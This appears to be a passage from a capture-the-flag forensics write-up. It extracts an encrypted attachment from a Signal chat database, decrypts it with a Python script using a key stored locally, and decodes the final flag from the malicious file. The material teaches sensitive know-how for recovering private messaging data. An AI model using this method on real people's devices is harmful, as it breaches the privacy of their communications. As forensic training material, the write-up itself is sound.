0x5d7952292072ac320e0d66108d47fbc4de306396cb8270cabdd855fa09b3ba69
```
Voila, I have successfully opened the database.

![data_ok](/img/okdata.png)

I checked the database, and found that there is one malicious file being transferred while the victim was talking to their collegues.

![sala](/img/luong.png)

Base on the path, I have extracted the file.

![rar](/img/rar.png)

Although this file is stored in the local folder, but it is also encrypted. They use `AES-256-CBC` to encrypt it. I now need Key and IV to decrypt it. Fortunately, those two are stored locally, right in the database.

Using the local key `R5/KK7BDJTSSE/aVyHVQSsXuQm1O/8UOjAxKkNzSSFIfxuR6Tn26s6efsgHkoWbCGr5p3VFbOwLVD2HFE4jXjQ==`, decode it, take the first 32 bytes to use as `AES Key`, and the latter is used as `HMAC Key`. The IV is the first 16 bytes of the salary file, the remaining data is the ciphertext. Got what needed, I used this script to decrypt the file.

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os

def decrypt_signal_attachment(input_file_path, output_file_path, local_key_b64):
    full_key = base64.b64decode(local_key_b64)
    aes_key = full_key[:32]
    hmac_key = full_key[32:]
    
    with open(input_file_path, 'rb') as f:
        file_content = f.read()
    
    iv = file_content[:16]
    ciphertext = file_content[16:]
    encrypted_data = ciphertext[:-32]
    
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    
    plaintext = unpad(decrypted_data, AES.block_size)
    
    with open(output_file_path, 'wb') as f_out:
        f_out.write(plaintext)

TARGET_LOCAL_KEY = "R5/KK7BDJTSSE/aVyHVQSsXuQm1O/8UOjAxKkNzSSFIfxuR6Tn26s6efsgHkoWbCGr5p3VFbOwLVD2HFE4jXjQ=="
INPUT_FILE = "8b5100ceb2c08f97f68dd12a30e97a4f6809f7365d8f5f170ea133bf93daae4f"
OUTPUT_FILE = "salary_staistics.rar"

decrypt_signal_attachment(INPUT_FILE, OUTPUT_FILE, TARGET_LOCAL_KEY)
```

![virus_sala](/img/virus_sala.png)

I opened (in sandbox) the decrypted file and I found a suspicious base encoded string.

```2b5xL21azPzV7HuJNWFMHE44wIVy2lswiV9NLUq0mrHUEh3gf2vcQtTc4RNTuAHnx```

Maybe the encoding process is just like the second part, I reused the script that I used to decoded the latter part.

```bash
$ python try_dec_base.py
W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-
```

Yeahhh, we got the full flag now.

#### Full flag: W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-4nD-Brok3n_RSA_key_with_Sm4l1_Exp0n3nt!!Chiyochiyochiyo}

**Note** 

This challenge took me three days to solve. Because I was thinking the RSA key for the first part couldn't be cracked :DDD (yeah, it is RSA, bro), I overthought it so much.

Many thanks to Mr.KetSoSad for giving me a hint about checking the database of the Signal Chat App. I overlooked the app many times, thinking Signal was just a normal app (not a chat app, bruhh), until I became hopeless. Then Mr.KetSoSad appeared like God to give me a breakthrough hint that helped me solve this challenge.
